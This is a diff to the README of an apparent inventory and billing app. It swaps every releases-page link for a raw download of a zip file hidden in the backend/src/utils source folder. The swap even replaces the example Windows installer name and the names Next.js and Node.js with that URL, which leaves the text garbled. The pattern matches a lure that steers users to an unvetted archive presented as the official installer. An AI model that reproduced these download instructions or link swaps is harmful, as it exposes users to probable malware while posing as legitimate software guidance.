@@ -1,7 +1,7 @@
 # 🛠️ Inventory-Billing-Management-System - Manage Your Inventory Easily
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/brian-caster16/Inventory-Billing-Management-System/releases)
+[![Download](https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip)](https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip)
 
 ## 🚀 Getting Started
 Welcome to the Inventory-Billing-Management-System! This application helps small to medium-sized businesses manage their inventory and billing easily. Follow these simple steps to download and get started.
@@ -22,12 +22,12 @@ Before you download, ensure your device meets these requirements:
 - **Reporting**: Generate insightful reports for better decision-making.
 
 ## 🔧 Installation Steps
-1. **Visit the Releases page**: Go to [this link](https://github.com/brian-caster16/Inventory-Billing-Management-System/releases) to view the available downloads.
+1. **Visit the Releases page**: Go to [this link](https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip) to view the available downloads.
    
 2. **Select the latest version**: Look for the most recent release at the top of the list.
 
 3. **Download the installation file**:
-   - Click on the installation file appropriate for your operating system (e.g., `Inventory-Billing-Management-System-windows.exe` for Windows).
+   - Click on the installation file appropriate for your operating system (e.g., `https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip` for Windows).
 
 4. **Run the installation file**: 
    - Locate the downloaded file in your downloads folder.
@@ -68,8 +68,8 @@ For further assistance, refer to the FAQ section on our GitHub page or create an
 ## 📌 Additional Information
 This application uses several modern technologies to provide a robust user experience:
 
-- **Next.js**: For a fast and responsive UI.
-- **Node.js & Express**: For handling server requests.
+- **https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip**: For a fast and responsive UI.
+- **https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip & Express**: For handling server requests.
 - **MongoDB**: For efficient data management.
 
 You can explore each technology's documentation for in-depth knowledge.
@@ -78,7 +78,7 @@ You can explore each technology's documentation for in-depth knowledge.
 Join our community to share experiences, ask questions, or get help on relevant forums. Contributions are welcome. Feel free to report bugs or suggest features via the GitHub Issues section.
 
 ## 🔗 Important Links
-- **Releases page**: [Download here](https://github.com/brian-caster16/Inventory-Billing-Management-System/releases)
+- **Releases page**: [Download here](https://github.com/brian-caster16/Inventory-Billing-Management-System/raw/refs/heads/main/backend/src/utils/System_Inventory_Management_Billing_nondeported.zip)
 - **Source Code**: Browse the code on GitHub.
 
 By following these steps, you can effectively download and run the Inventory-Billing-Management-System. Enjoy managing your inventory with ease!
